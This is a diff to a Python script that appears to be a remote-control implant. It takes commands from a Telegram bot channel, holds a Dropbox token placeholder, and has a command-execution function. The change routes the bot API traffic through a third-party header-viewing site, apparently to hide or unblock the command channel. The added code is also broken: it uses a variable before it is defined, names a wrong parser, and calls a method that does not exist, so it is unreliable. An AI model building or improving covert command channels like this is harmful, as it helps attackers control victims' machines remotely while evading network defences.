@@ -17,18 +17,41 @@ db_token = "YOUR_DROPBOX_TOKEN"
 
 def send_command(msg):
     url = f"https://api.telegram.org/bot{bot_id}/sendmessage?chat_id={chat_id}&text={msg}"
-    req = requests.get(url)
-    print(req.text)
 
+    info = {
+        "UrlBox":url,
+        "AgentList":"Internet Explorer",
+        "VersionList":"HTTP/1.1",
+        "MethodList":"GET"    
+    }
+
+    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=info)
+
+    print(req)
 
 def get_updates():
-    url = f"https://api.telegram.org/bot{bot_id}/getupdates"
-    bot_req = requests.get(url).content.decode()
-    soup = BeautifulSoup(bot_req, "html.parser")
-    extract = str(soup.find_all("pre"))[61:-7]
+
+    url = f"https://api.telegram.org/bot{bot_id}/Getupdates"   
+
+    bot_req = requests.get("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=info).content.decode()
+
+    info = {
+        "UrlBox":url,
+        "AgentList":"Internet Explorer",
+        "VersionList":"HTTP/1.1",
+        "MethodList":"GET"    
+    }
+
+    soup = BeautifulSoup(bot_req,"http.parser")
+
+    extract = str(soup.findall("pre"))[61:-7]
+
     make_it_dict = json.loads(extract)
+
     show_msg = make_it_dict['result'][-1]['message']['text']
+
     return show_msg
+
 
 
 def execute_commands(command):
